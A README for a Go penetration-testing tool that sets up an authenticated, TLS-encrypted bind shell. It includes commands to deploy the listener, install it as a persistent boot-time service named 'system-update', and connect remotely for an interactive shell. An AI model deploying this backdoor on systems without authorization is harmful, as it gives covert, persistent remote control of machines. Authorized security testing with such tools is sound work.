```text
  ____ _                          ____  _      _             
 / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
 \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
                            |___/  

https://github.com/azizhayat37/cherrypicker           
```

# CherryPicker

Authenticated bind shell for authorized penetration testing — deploy a listener on authorized target systems, then connect remotely to establish an interactive shell.

> ⚠️ Legal: Use this tool only on systems you own or where you have explicit written permission. Unauthorized use is illegal.

---

## Quick Start

### Build
```bash
# Build target (to deploy on target)
cd target && go build -o cherrypicker-target

# Build attacker (from your machine)
cd ../attacker && go build -o cherrypicker-attacker
```

### Deploy target (authorized systems only)
```bash
# Run (port and signature required)
./cherrypicker-target -p 8888 -s "YourSecretKey123"

# Install as service/daemon (requires admin/root)
sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
```

### Connect from attacker
```bash
./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourSecretKey123"
```

---

## What it Does

- Target module: listens on a TCP port on authorized targets.
- Attacker module: connects to target and establishes an interactive shell.
- Authentication: SHA256 challenge-response using a shared secret.
- Transport: TLS 1.2+ by default (self-signed certs auto-generated).

---

## Command-line Options

### Target
| Flag | Required | Description |
|------|----------|-------------|
| `-p` | Yes | Port to listen on |
| `-s` | Yes | Authentication signature/key (min 10 chars) |
| `-install` | No | Install as service/daemon |
| `-tls` | No (default: true) | Enable TLS |
| `-cert` | No | TLS certificate path |
| `-key` | No | TLS key path |

### Attacker
| Flag | Required | Description |
|------|----------|-------------|
| `-t` | Yes | Target IP address |
| `-p` | Yes | Target port |
| `-s` | Yes | Authentication signature/key |
| `-timeout` | No (default: 10s) | Connection timeout |
| `-tls` | No (default: true) | Use TLS |
| `-insecure` | No (default: true) | Skip cert verification (for self-signed certs) |

---

## Authentication & Transport

- Challenge-response: target sends a random nonce; attacker returns SHA256(nonce + shared_key). Match spawns shell.
- TLS (default): protects handshake and all session traffic. Use `-cert`/`-key` for custom certs. Use `-insecure=false` on attacker to enforce validation.

---

## Architecture (simplified)
```
Attacker                Network                Target
---------               -------                ------
cherrypicker-attacker  ── connect ──▶  cherrypicker-target
        - SHA256(response)  ◀─ challenge ─────
        - Interactive shell  ◀─ shell I/O ─────
```

---

## Features

- SHA256 challenge-response auth
- TLS 1.2+ (auto self-signed certs)
- Cross-platform (Linux/macOS/Windows)
- Optional persistent install as service/daemon
- Auto-restart on crash, auto-start on boot
- IPv6 support, configurable ports and keys

---

## Security Notes

- All parameters are required; use strong random signatures (min 10 chars).
- Target listens on 0.0.0.0 by default — restrict with firewall rules.
- Prefer custom certs and `-insecure=false` for production.
- Monitor and log connection attempts.

---

## Troubleshooting

- "Connection refused": ensure target module is running and firewall allows the port.
- "Authentication failed": verify identical `-s` values on both sides (case-sensitive).
- "Connection timeout": increase `-timeout` or verify network reachability.

Remove persistence (examples):
```bash
# Linux
sudo systemctl stop system-update
sudo systemctl disable system-update
sudo rm /etc/systemd/system/system-update.service
```

---

## Building from Source & Project Layout

```bash
git clone https://github.com/azizhayat37/cherrypicker.git
cd cherrypicker
cd target && go build -o cherrypicker-target
cd ../attacker && go build -o cherrypicker-attacker
```

Repository layout:
```
cherrypicker/
├── target/
│   └── main.go
├── attacker/
│   └── main.go
├── README.md
└── LICENSE
```

---

For detailed usage and examples see USAGE.md. License and allowed use described in LICENSE.
